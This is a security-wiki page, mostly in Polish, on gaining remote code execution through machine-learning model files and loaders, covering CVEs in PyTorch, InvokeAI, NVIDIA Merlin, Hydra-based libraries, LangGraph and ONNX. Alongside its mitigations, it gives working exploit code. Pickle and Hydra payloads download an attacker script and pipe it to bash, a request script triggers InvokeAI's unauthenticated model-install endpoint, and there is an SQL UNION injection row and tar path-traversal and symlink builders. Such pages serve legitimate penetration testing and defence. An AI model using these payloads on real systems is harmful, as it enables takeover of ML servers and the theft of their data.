# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Modele Machine Learning są zwykle udostępniane w różnych formatach, takich jak ONNX, TensorFlow, PyTorch, itd. Te modele mogą być ładowane na maszyny developerów lub do systemów produkcyjnych, aby z nich korzystać. Zwykle modele nie powinny zawierać złośliwego kodu, ale są pewne przypadki, gdy model może zostać użyty do wykonania arbitralnego kodu na systemie, jako zamierzona funkcja albo z powodu podatności w bibliotece ładującej model.

W momencie pisania tych słów są to przykłady tego typu podatności:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Złośliwy pickle w checkpoint modelu prowadzi do code execution (omijając zabezpieczenie `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + złośliwy model download powoduje code execution; Java deserialization RCE w management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Niezaufany checkpoint wyzwala pickle reducer podczas `load_model_trainer_states_from_checkpoint` → code execution w ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kontrolowany przez użytkownika klucz `filter` wstrzykuje składnię SQL/JSON-path, `UNION SELECT` tworzy fałszywy wiersz checkpointu, a następnie deserializacja `msgpack` importuje i wywołuje kod Pythona wybrany przez atakującego | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Ładowanie modelu z YAML używa `yaml.unsafe_load` (code exec) <br> Ładowanie modelu z warstwą **Lambda** uruchamia arbitralny kod Pythona          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Spreparowany model `.tflite` wywołuje integer overflow → heap corruption (potencjalne RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Ładowanie modelu przez `joblib.load` wykonuje pickle z payloadem `__reduce__` atakującego                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *sporne*                                                                              | Domyślne `numpy.load` pozwalało na pickled object arrays – złośliwe `.npy/.npz` wyzwalało code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Ścieżka external-weights modelu ONNX może wyjść poza katalog (odczyt arbitralnych plików) <br> Złośliwy tar modelu ONNX może nadpisać arbitralne pliki (prowadząc do RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model z custom operator wymaga załadowania natywnego kodu atakującego; złożone grafy modelu nadużywają logiki, aby wykonać niezamierzone obliczenia   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Użycie model-load API z włączonym `--model-control` pozwala na relative path traversal do zapisu plików (np. nadpisanie `.bashrc` dla RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Niepoprawny plik modelu GGUF powoduje heap buffer overflows w parserze, umożliwiając arbitralne code execution na systemie ofiary                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Złośliwy model HDF5 (`.h5`) z kodem warstwy Lambda nadal wykonuje się przy load (Keras safe_mode nie obejmuje starego formatu – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Wiele narzędzi ML (np. formaty modeli oparte na pickle, Python `pickle.load`) wykona arbitralny kod osadzony w plikach modelu, jeśli nie zostanie to zmitigowane | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadane/konfiguracja modelu kontrolowane przez atakującego ustawiają `_target_` na arbitralny callable (np. `builtins.exec`) → wykonywane podczas load, nawet przy “safe” formatach (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ponadto istnieją modele oparte na python pickle, takie jak te używane przez [PyTorch](https://github.com/pytorch/pytorch/security), które mogą posłużyć do wykonania arbitralnego kodu na systemie, jeśli nie są ładowane z `weights_only=True`. Zatem każdy model oparty na pickle może być szczególnie podatny na tego typu ataki, nawet jeśli nie został wymieniony w tabeli powyżej.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` importuje i wywołuje dowolny dotted `_target_` w obiekcie konfiguracji/metadanych. Gdy biblioteki przekazują **untrusted model metadata** do `instantiate()`, atakujący może dostarczyć callable i argumenty, które wykonują się natychmiast podczas load modelu (nie jest wymagany pickle).

Przykład payloadu (działa w `.nemo` `model_config.yaml`, repo `config.json` lub `__metadata__` wewnątrz `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Kluczowe punkty:
- Wyzwalane przed inicjalizacją modelu w NeMo `restore_from/from_pretrained`, koderach uni2TS HuggingFace oraz loaderach FlexTok.
- Stringowy block-list Hydry można obejść przez alternatywne ścieżki importu (np. `enum.bltns.eval`) albo nazwy rozwiązywane przez aplikację (np. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok dodatkowo parsuje metadane zapisane jako string za pomocą `ast.literal_eval`, co umożliwia DoS (CPU/memory blowup) przed wywołaniem Hydry.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny open-source web interface dla Stable-Diffusion. Wersje **5.3.1 – 5.4.2** udostępniają REST endpoint `/api/v2/models/install`, który pozwala użytkownikom pobierać i ładować modele z dowolnych URL.

Wewnętrznie endpoint ostatecznie wywołuje:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Gdy dostarczony plik to **PyTorch checkpoint (`*.ckpt`)**, `torch.load` wykonuje **deserializację pickle**. Ponieważ zawartość pochodzi bezpośrednio z kontrolowanego przez użytkownika URL, atakujący może osadzić złośliwy obiekt z niestandardową metodą `__reduce__` wewnątrz checkpointu; metoda jest wykonywana **podczas deserializacji**, co prowadzi do **remote code execution (RCE)** na serwerze InvokeAI.

Luka otrzymała oznaczenie **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hostuj `payload.ckpt` na serwerze HTTP, który kontrolujesz (np. `http://ATTACKER/payload.ckpt`).
3. Wyzwól podatny endpoint (uwierzytelnianie nie jest wymagane):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Gdy InvokeAI pobiera plik, wywołuje `torch.load()` → gadget `os.system` uruchamia się i atakujący uzyskuje wykonanie kodu w kontekście procesu InvokeAI.

Gotowy exploit: moduł **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatyzuje cały przepływ.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (domyślnie flaga scan **false**)
•  `/api/v2/models/install` dostępny dla atakującego
•  Proces ma uprawnienia do wykonywania poleceń shell

#### Mitigations

* Zaktualizuj do **InvokeAI ≥ 5.4.3** – poprawka ustawia `scan=True` domyślnie i wykonuje skanowanie malware przed deserializacją.
* Podczas programowego ładowania checkpointów używaj `torch.load(file, weights_only=True)` albo nowego helpera [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Wymuś allow-lists / signatures dla źródeł modeli i uruchamiaj usługę z najmniejszymi uprawnieniami.

> ⚠️ Pamiętaj, że **każdy** format oparty na Python pickle (w tym wiele plików `.pt`, `.pkl`, `.ckpt`, `.pth`) jest z natury niebezpieczny do deserializacji z niezaufanych źródeł.

---

Przykład doraźnej mitigacji, jeśli musisz utrzymać starsze wersje InvokeAI działające za reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (część Merlin) udostępniał niebezpieczny loader checkpointów, który bezpośrednio wywoływał `torch.load()` na ścieżkach podanych przez użytkownika. Ponieważ `torch.load` opiera się na Python `pickle`, checkpoint kontrolowany przez atakującego może wykonać dowolny kod poprzez reducer podczas deserializacji.

Podatna ścieżka (przed poprawką): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Dlaczego prowadzi to do RCE: W Python pickle obiekt może zdefiniować reducer (`__reduce__`/`__setstate__`), który zwraca callable i argumenty. Callable jest wykonywany podczas unpickling. Jeśli taki obiekt znajduje się w checkpoint, uruchamia się zanim jakiekolwiek wagi zostaną użyte.

Minimalny przykład złośliwego checkpoint:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Wektory dostarczenia i blast radius:
- Trojanized checkpoints/models udostępniane przez repo, buckets lub artifact registries
- Zautomatyzowane resume/deploy pipelines, które auto-load checkpoints
- Wykonanie odbywa się wewnątrz training/inference workers, często z podwyższonymi uprawnieniami (np. root w containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zastąpił bezpośrednie `torch.load()` ograniczonym, allow-listed deserializer zaimplementowanym w `transformers4rec/utils/serialization.py`. Nowy loader waliduje types/fields i zapobiega wywoływaniu arbitralnych callables podczas load.

Wskazówki defensive specyficzne dla PyTorch checkpoints:
- Nie unpickle niezaufanych danych. Jeśli to możliwe, preferuj nie-executable formaty, takie jak [Safetensors](https://huggingface.co/docs/safetensors/index) lub ONNX.
- Jeśli musisz używać PyTorch serialization, upewnij się, że `weights_only=True` (obsługiwane w nowszym PyTorch) albo użyj custom allow-listed unpickler podobnego do patcha Transformers4Rec.
- Wymuszaj model provenance/signatures i sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS i brak network egress).
- Monitoruj nieoczekiwane child processes z ML services w czasie load checkpointów; śledź użycie `torch.load()`/`pickle`.

POC i referencje vulnerable/patch:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Załaduj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD udostępnia endpoint `resnet`, który deserializuje dane kontrolowane przez użytkownika. ZDI potwierdziło, że zdalny atakujący może nakłonić ofiarę do załadowania złośliwej strony/pliku, doprowadzić do wysłania spreparowanego serializowanego blobu do tego endpointu i wywołać deserializację jako `root`, co prowadzi do pełnego przejęcia.

Przebieg exploita odpowiada typowemu nadużyciu pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Każdy gadget osiągalny podczas deserializacji (konstruktory, `__setstate__`, callbacki frameworka itp.) może zostać użyty do ataku w ten sam sposób, niezależnie od tego, czy transportem był HTTP, WebSocket, czy plik wrzucony do obserwowanego katalogu.



### LangGraph checkpointer SQLi → MessagePack RCE

Ten łańcuch ataku jest interesujący, ponieważ atakujący **nie musi przesyłać złośliwego pliku modelu**. Zamiast tego aplikacja udostępnia **AI-agent persistence API** (`get_state_history(..., filter=...)`), a dane wejściowe użytkownika trafiają do query builder checkpointera.

#### 1. Structural SQLi w filtrach metadanych

Podatny wzorzec SQLite wyglądał tak:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Wartość jest wiązana później, ale `query_key` jest konkatenowane do **łańcucha ścieżki JSON**, więc `'` wewnątrz klucza słownika wychodzi poza `'$.{query_key}'` i wstrzykuje SQL. Ta sama lekcja dotyczy **ścieżek JSON, identyfikatorów, operatorów, `LIMIT` i pól TTL**: placeholdery chronią tylko wartości, a nie strukturalną składnię zapytania.

#### 2. `UNION SELECT` może celować w downstream sinks, nie tylko w kradzież danych

Zapytanie zwraca `type` i serializowane bajty `checkpoint`, które są później wykorzystywane jako:
```python
self.serde.loads_typed((type, checkpoint))
```
Oznacza to, że SQLi w klauzuli `WHERE` może wstrzyknąć **fake result row**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Jeśli później kod parsuje, deserializuje, zapisuje lub wykonuje dowolną wybraną kolumnę, zmapuj te kolumny do ich sinków. W tym przypadku fałszywy wiersz zamienia SQLi w **deserializację kontrolowaną przez atakującego**.

#### 3. Niebezpieczne hooki rozszerzeń MessagePack są równoważne code gadgets

Ścieżka `msgpack` w LangGraph używała niestandardowego hooka rozszerzenia, który rozpakowywał zagnieżdżoną krotkę i wykonywał:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Tak więc obiekt rozszerzenia MessagePack kodujący coś równoważnego `("os", "system", "id > /tmp/pwned")` importuje `os`, rozwiązuje `system` i uruchamia polecenie. Podczas przeglądania frameworków AI sprawdzaj **custom MessagePack/JSON/pickle revivers** pod kątem dynamicznych importów, reflection lub arbitralnego dispatchu callable.

#### 4. Praktyczny wzorzec audytu dla frameworków agentów

Przejrzyj każdy input kontrolowany przez użytkownika, który trafia do:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders, które generują SQL lub Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths, które ufają wierszom zwracanym z persistence layer

Ten konkretny chain dotyczył self-hosted wdrożeń LangGraph używających **SQLite** lub **Redis** checkpointers, gdy nieufni użytkownicy mogli kontrolować `filter`. Wersje załatane, wymienione w disclosure, to `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` oraz `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

Jak skomentowano w [**tym wpisie na blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), większość formatów modeli używanych przez różne frameworki AI opiera się na archiwach, zwykle `.zip`. Dlatego może być możliwe nadużycie tych formatów do wykonania ataków path traversal, pozwalających odczytać dowolne pliki z systemu, na którym model jest ładowany.

Na przykład, przy użyciu poniższego kodu możesz stworzyć model, który po załadowaniu utworzy plik w katalogu `/tmp`:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Albo, przy użyciu poniższego kodu możesz utworzyć model, który po załadowaniu stworzy symlink do katalogu `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras deserialization and gadget hunting

W przypadku skoncentrowanego przewodnika po wnętrzu .keras, Lambda-layer RCE, issue z arbitralnym importem w ≤ 3.8 oraz odkrywaniu gadgetów po poprawce wewnątrz allowlist, zobacz:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
